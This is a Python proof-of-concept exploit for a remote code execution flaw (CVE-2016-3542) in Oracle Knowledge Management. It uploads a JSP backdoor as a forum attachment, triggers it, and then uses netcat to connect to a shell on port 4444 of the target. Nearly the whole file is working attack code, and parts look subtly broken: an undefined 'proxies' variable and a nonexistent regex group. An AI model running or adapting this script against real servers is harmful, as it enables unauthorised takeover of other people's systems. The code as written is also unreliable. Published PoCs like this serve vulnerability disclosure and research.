#!/usr/bin/python
# Oracle Knowledge Management Forum Attachment Upload Remote Code Execution Vulnerability
# Found by Steven Seeley of Source Incite
# CVE: CVE-2016-3542
# SRC: SRC-2016-0025
# Notes:
# - The target environment must have the "InfoManager" as well as the "infocenter" applications deployed
# - The exploit works by uploading a shell via the forum
# - The exploit assumes that there is only 1 forum and 1 board as it is merely a PoC.
# 
# Testing Notes:
# - You will need to login to "InfoManager" using the admin account and create a admin user for "infocenter"
# - You will need to then use that user to create a discussion board called "test" and forum (any name as the exploit should 'find' it)
# - Now test the exploit. You should, in no way, need that user or any other user for the exploit to work.

import requests
import re
import sys
import os

from time import sleep
from threading import Thread

from time import sleep

# used to make a threaded request at the server
class req_thread(Thread):
    def __init__(self, r, uri):
        Thread.__init__(self)
        self.r = r
        self.uri = uri

    def run(self):
        self.r.head(self.uri)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
   
def print_action(string):
    print bcolors.OKBLUE + string + bcolors.ENDC

def print_fail(string):
    print bcolors.FAIL + string + bcolors.ENDC

def print_success(string):
    print bcolors.OKGREEN + string + bcolors.ENDC

def banner():
    banner = """  
             888                                  888 
         e88'888 888 ee   ,e e,   dP"Y  e88 88e   e88 888 
        d888  '8 888 88b d88 88b C88b  d888 888b d888 888 
        Y888   , 888 888 888   ,  Y88D Y888 888P Y888 888 
         "88,e8' 888 888  "YeeP" d,dP   "88 88"   "88 888
        Oracle Knowledge 8.5.1 Remote Code Execution 0day
                               mr_me 2015
    """
    print bcolors.HEADER + banner + bcolors.ENDC
if len(sys.argv) < 2:
    banner()
    print "(+) Usage %s [target]" % sys.argv[0]
    exit(1)

target = sys.argv[1]
banner()
s = requests.Session()
print_action("(+) Getting board id...")
r_board = s.get("http://%s:8226/infocenter/index?page=forums" % target)

board_match = re.search("<a href=\"index\?page=forums&board=(.*)\">", r_board.text)
if board_match:
    print_success("(+) Got the board id!")
    print_action("(+) Getting forum id...")
    r_forum = s.get("http://%s:8226/infocenter/index?page=forums&board=%s" % (target, board_match.group(1)))
    forum_match = re.search("<a href=\"index\?page=forums&forum=(.*)\">(.*)<\/a>", r_forum.text)
    if forum_match:
        print_success("(+) Got the forum id!")
        print_action("(+) Getting the success and error encrypted strings...")
        r_success_error = s.get("http://%s:8226/infocenter/index?page=forums_topic&forum=%s" % (target, forum_match.group(1)))
        payload = r_success_error.text
        match_success = re.search('<input type="hidden" name="success" value="(.*)"/></div>', payload)
        match_error = re.search('<input type="hidden" name="error" value="(.*)"/></div>', payload)
        if match_success and match_error:
            print_success("(+) Got the success and error encrypted strings!")
            print_success("(+) Found success value: %s" % match_success.group(1))
            print_success("(+) Found error value: %s" % match_error.group(1))
            url = "http://%s:8226/infocenter/index" % target
            multiple_files = [
                ('action', (None, 'IMDiscussionMessageAction')),
                ('success', (None, match_success.group(1))),
                ('error', (None, match_error.group(1))),
                ('forumid', (None, forum_match.group(1))),
                ('mode', (None, 'ADD')),
                ('type', (None, 'TOPIC')),
                ('publish', (None, 'true')),
                ('title', (None, 'si owns you')),
                ('textvalue', (None, 'mr_me')),
                ('fileattached', 
                    ('si.jsp', open('si.jsp', 'rb'), 'application/octet-stream')
                ),
            ]
            print_action("(+) Hold onto your knickers, uploading the backdoor...")
            r_upload = s.post(url, files=multiple_files, allow_redirects=False, proxies=proxies)
            topic_id = re.search("&newguid=(.*)&newtopic=true", r_upload.headers['Location'])
            if topic_id:
                print_success("(+) Successfully uploaded the backdoor!")
                forum_resource_id = forum_match.group(2).upper().replace(" ", "_")
                board_resource_id = board_match.group(2).upper().replace(" ", "_")
                bd_uri = "http://%s:8226/resources/sites/IM/discussionboards/%s/forums/%s/topics/%s/si.jsp" % (target, board_resource_id, forum_resource_id, topic_id.group(1))
                print_action("(!) Triggering backdoor!")
                bd_request = req_thread(s, bd_uri)
                bd_request.start()
                sleep(1)
                # game over
                os.system("nc -v %s 4444" % (sys.argv[1]))
